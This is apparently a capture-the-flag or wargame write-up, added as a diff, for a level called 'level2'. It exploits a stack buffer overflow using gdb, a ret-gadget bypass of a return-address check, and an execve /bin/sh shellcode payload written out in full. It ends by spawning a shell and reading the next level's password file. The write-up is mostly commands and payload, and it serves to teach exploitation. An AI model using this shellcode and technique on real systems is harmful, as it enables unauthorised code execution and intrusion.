@@ -1,0 +1,38 @@
+The address of buffer with env under gdb is not the same as outside gdb
+Therefor we need to remove two env variables from gdb:
+
+gdb level2
+(gdb) unset env LINES
+(gdb) unset env COLUMNS
+
+After 80 char we start overwriting eip
+(gdb) r < <(python -c 'print "A"*80 + "BBBB"')
+
+In order to find the start of our buffer we set a breakpoint after call to gets
+Run the program with an input and try to find the start of the input
+
+(gdb) disass p
+(gdb) b *0x080484f2
+(gdb) r < <(python -c 'print "A"*60')
+(gdb) x/32x $esp
+
+Printing esp will give us the begining of the buffer address 0xbffff70c
+We can verify by printing it with x/32x 0xbffff70c
+
+The address injected after 80 char is tested so it cannot be 0xb....
+Therefor we need to enter a valid address like the address of ret
+followed by our buffer address (ret address id 0x0804853e)
+
+Now we need to put a shellcode in start of buffer so it will be executed:
+
+(gdb) r < <(python -c 'print "\xeb\x18\x5e\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\xb0\x0b\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68" + "\x90"*42+ "\x08\x04\x85\x3e"[::-1] + "\xbf\xff\xf7\x0c"[::-1]')
+
+Gdb tells us that a new program is beeing executed, it's /bin/dash!
+
+Finaly just execute outside gdb the following command:
+
+(python -c 'print "\xeb\x18\x5e\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\xb0\x0b\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68" + "\x90"*42+ "\x08\x04\x85\x3e"[::-1] + "\xbf\xff\xf7\x0c"[::-1]'; cat -) | ./level2
+
+whoami
+cd ../level3
+cat .pass
